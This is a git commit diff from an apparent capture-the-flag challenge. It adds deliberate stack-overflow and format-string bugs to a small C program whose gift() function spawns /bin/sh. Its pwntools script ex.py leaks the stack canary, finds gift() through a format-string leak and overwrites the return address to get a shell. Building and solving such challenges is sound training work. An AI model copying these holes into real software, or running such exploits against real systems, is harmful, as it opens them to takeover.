704d94572dcae08921686755a5e58f3e900bfe13
Minjea Lee <gabe0529@naver.com>
2022-01-29 03:22:38 -0800

    s! 2022 ctf v1 2022.01.29

--- 2022_S!_CTF/ctf.c
+++ 2022_S!_CTF/ctf.c
@@ -14,8 +14,8 @@ void initialize() {
     setvbuf(stdin, NULL, _IONBF, 0);
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    signal(SIGALRM, alarm_handler);
-    alarm(30);
+    // signal(SIGALRM, alarm_handler);
+    // alarm(100);
 }
 
 void happy(){
@@ -33,33 +33,42 @@ void happy(){
 }
 
 void Two_Thousand_Twenty_Two(){
-    puts("        ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄    ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄ ");
-    puts("       ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌  ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌");
-    puts("        ▀▀▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌");
-    puts("                 ▐░▌▐░▌▐░▌    ▐░▌▐░▌▐░▌    ▐░▌          ▐░▌");
-    puts("                 ▐░▌▐░▌ ▐░▌   ▐░▌▐░▌ ▐░▌   ▐░▌          ▐░▌");
-    puts("        ▄▄▄▄▄▄▄▄▄█░▌▐░▌  ▐░▌  ▐░▌▐░▌  ▐░▌  ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌");
-    puts("       ▐░░░░░░░░░░░▌▐░▌   ▐░▌ ▐░▌▐░▌   ▐░▌ ▐░▌▐░░░░░░░░░░░▌");
-    puts("       ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌    ▐░▌▐░▌▐░▌    ▐░▌▐░▌▐░█▀▀▀▀▀▀▀▀▀ ");
-    puts("       ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄▄▄ ");
-    puts("       ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌  ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌");
-    puts("        ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀ ");
+    puts("        ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ ");
+    puts("       ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌");
+    puts("        ▀▀▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌");
+    puts("                 ▐░▌▐░▌▐░▌    ▐░▌          ▐░▌          ▐░▌");
+    puts("                 ▐░▌▐░▌ ▐░▌   ▐░▌          ▐░▌          ▐░▌");
+    puts("        ▄▄▄▄▄▄▄▄▄█░▌▐░▌  ▐░▌  ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌");
+    puts("       ▐░░░░░░░░░░░▌▐░▌   ▐░▌ ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌");
+    puts("       ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌    ▐░▌▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ");
+    puts("       ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ");
+    puts("       ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌");
+    puts("        ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ ");
 }
 
 void gift(){
     system("/bin/sh");
 }
 
+void profile(){
+    char buf[32] = {};
+
+    printf("What kind of bird do you like? >> ");
+    read(0, buf, 512);
+    printf("Oh you like this bird!! >> %s", &buf);
+    printf("What's your bucket list for 2022? >> ");
+    read(0, buf, 512);
+    printf(buf);
+    printf("Additional comments >> ");
+    read(0, buf, 0x200);
+}
+
 int main(int argc, char *argv[]) {
-    char buf[0x80] = {};
     initialize();
     happy();
     Two_Thousand_Twenty_Two();
-    printf("What kind of bird do you like? >> ");
-    read(0, &buf, 0x84);
-    printf("Oh you like this bird!! >> %s", &buf);
-    read(0, &buf, 0x100);
 
-
+    profile();
+    
     return 0;
 }
--- 2022_S!_CTF/ex.py
+++ 2022_S!_CTF/ex.py
@@ -1,29 +1,41 @@
 from pwn import *
 
-puts_got = 0x601018
-puts_plt = 0x400620
-
-gets_got = 0x601048
-gets_plt = 0x400680
-
+gift_offset = 0x14a
 
 p = process("./ctf")
 
 canary_pay = b""
-canary_pay += b"A" * 0x81
+canary_pay += b"A" * 33
 
 p.sendafter(">> ",canary_pay)
-p.recvuntil("A" * 0x80)
+p.recvuntil(">>")
+p.recvuntil("A" * 32)
 
-leak = p.recv(8)[1:]
-print(hex(leak))
-# canary = u64(b"\x00" + leak)
+leak = p.recv(4)[1:]
+canary = u32(b"\x00" + leak)
 
-# print(hex(canary))
+
+print(hex(canary))
+input()
+p.recvuntil(">> ")
 
 pay = b""
-pay += b"A"*0x82
-
+pay += b"%lx-" * 11
 p.send(pay)
+
+p.recvuntil("-2d786c25" * 5)
+p.recv(5)
+ret_leak = u32(p.recv(4))
+gift = ret_leak - gift_offset
+
+print(hex(gift))
+
+pay2 = b""
+pay2 += b"A"*32
+pay2 += p32(canary)
+pay2 += b"B"*12
+pay2 += p32(gift)
+
+p.send(pay2)
 
 p.interactive()
